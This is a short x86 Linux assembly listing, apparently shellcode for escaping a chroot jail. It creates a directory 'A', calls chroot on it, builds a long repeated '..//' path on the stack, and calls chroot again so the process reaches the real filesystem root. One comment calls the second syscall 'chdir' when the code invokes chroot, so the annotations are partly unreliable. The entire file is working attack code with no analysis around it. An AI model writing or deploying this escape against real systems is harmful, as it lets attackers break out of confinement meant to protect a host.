.globl main

main:
  xorl	%edx, %edx

  /*
   * mkdir("A");
   */

  pushl	%edx
  push	$0x41
  
  movl	%esp, %ebx
  movw	$0x01ed, %cx

  leal	0x27(%edx), %eax
  int	$0x80

  /*
   * chdir("A");
   */

  leal	0x3d(%edx), %eax
  int	$0x80

  /*
   * chroot("..//..//..//..//..//..//..//..//..//..//..//..//..//"); 
   */

  xorl	%esi, %esi
  pushl	%edx

loop:
  pushl	$0x2f2f2e2e

  incl 	%esi

  cmpl	$0x10, %esi
  jl	loop

  movl	%esp, %ebx


  leal	0x3d(%edx), %eax
  int 	$0x80
